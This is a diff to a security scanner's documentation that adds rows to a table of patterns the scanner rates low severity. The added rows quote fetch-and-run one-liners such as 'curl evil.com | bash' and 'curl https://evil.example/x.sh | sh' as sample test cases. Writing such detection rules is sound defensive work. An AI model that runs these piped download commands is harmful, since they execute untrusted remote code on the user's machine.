@@ -41,6 +41,8 @@ The scanner has built-in **context-aware checks** that automatically skip safe p
 | `subprocess.run(["git", "status"])` | First argument is a hardcoded string literal |
 | `subprocess.run(cmd, shell=False)` | Explicit `shell=False` prevents shell injection |
 | `ast.literal_eval(data)` | Safe eval — only parses Python literals |
+| `curl install.sh \| bash`, or `https://raw.githubusercontent.com/.../install.sh \| bash` | Nothing to fetch as written: a bare installer file name, or a literally elided path (low). Real URLs, hosts like `bun.sh/install` and variables (`$URL`) stay critical |
+| `{"name": "Curl Pipe Bash", "category": "commands", "text": "curl evil.com \| bash"}` in Python, or `{"cmd": "curl https://evil.example/x.sh \| sh", "expect": "SHADOW"}` in JSON | An attack sample in a security tool's test cases (low). In JSON only when every host is reserved (`.example`, `.invalid`, `example.com`). A sample whose key reaches an exec sink stays critical |
 | `json.loads(text)` | Not actually `eval()` despite containing "eval" in the call |
 | `open("config.json", "r").read()` | Hardcoded file path string |
 | `with open(path) as f:` | Context manager ensures proper resource handling |
